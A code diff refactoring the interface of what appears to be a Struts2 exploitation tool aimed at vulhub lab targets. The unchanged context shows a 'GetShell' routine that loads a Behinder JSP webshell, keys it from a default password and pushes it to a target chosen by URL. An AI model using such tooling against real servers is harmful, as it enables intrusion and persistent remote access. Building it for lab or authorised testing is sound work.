@@ -4,6 +4,7 @@ import 'package:crypto/crypto.dart';
 import 'package:flutter/material.dart';
 import 'package:flutter/services.dart' show Clipboard, ClipboardData, rootBundle;
 
+import '../../app/constants.dart';
 import '../../database/database_helper.dart';
 import '../../exp/vulhub/struts2_exp_service.dart';
 import '../../models/project.dart';
@@ -65,7 +66,9 @@ class _Struts2CardState extends State<_Struts2Card> {
   final _timeoutCtrl = TextEditingController();
   final _pathCtrl = TextEditingController(text: 'struts2-showcase');
   final _logScroll = ScrollController();
-  final _passwordCtrl = TextEditingController(text: 'mAtrix_911');
+  final _passwordCtrl = TextEditingController(
+    text: AppConstants.defaultShellPassword,
+  );
 
   Struts2VulnType _selected = Struts2VulnType.s2045;
   String _log = '';
@@ -75,7 +78,9 @@ class _Struts2CardState extends State<_Struts2Card> {
     setState(() {
       final lines = _log.isEmpty ? <String>[] : _log.split('\n');
       lines.add(line);
-      if (lines.length > 500) lines.removeRange(0, lines.length - 500);
+      if (lines.length > AppConstants.logBufferSize) {
+        lines.removeRange(0, lines.length - AppConstants.logBufferSize);
+      }
       _log = lines.join('\n');
     });
     WidgetsBinding.instance.addPostFrameCallback((_) {
@@ -88,7 +93,10 @@ class _Struts2CardState extends State<_Struts2Card> {
 
   Struts2ExpService _svc() => Struts2ExpService(
         url: _urlCtrl.text.trim(),
-        timeout: Duration(seconds: int.tryParse(_timeoutCtrl.text.trim()) ?? 10),
+        timeout: Duration(
+          seconds: int.tryParse(_timeoutCtrl.text.trim()) ??
+              AppConstants.defaultHttpTimeoutSeconds,
+        ),
       );
 
   Future<void> _check() async {
@@ -163,7 +171,9 @@ class _Struts2CardState extends State<_Struts2Card> {
     setState(() => _running = true);
     _appendLog('[*] GetShell (${_selected.label})...');
     try {
-      final password = _passwordCtrl.text.trim().isEmpty ? 'mAtrix_911' : _passwordCtrl.text.trim();
+      final password = _passwordCtrl.text.trim().isEmpty
+          ? AppConstants.defaultShellPassword
+          : _passwordCtrl.text.trim();
       var shellContent = await rootBundle.loadString('assets/defaults/payloads/jsp_behinder.jsp');
       final key = md5.convert(utf8.encode(password)).toString().substring(0, 16);
       shellContent = shellContent.replaceFirst(RegExp(r'String k="[0-9a-f]{16}"'), 'String k="$key"');
@@ -316,7 +326,7 @@ class _Struts2CardState extends State<_Struts2Card> {
           crossAxisAlignment: CrossAxisAlignment.start,
           children: [
             _sectionTitle('目标配置'),
-            _tf(_urlCtrl, '目标 URL', 'http://target.com:8080/'),
+            _tf(_urlCtrl, '目标 URL', 'http://localhost:8080'),
             const SizedBox(height: 8),
             _tf(_timeoutCtrl, '超时(s)', '10', type: TextInputType.number),
             const SizedBox(height: 8),
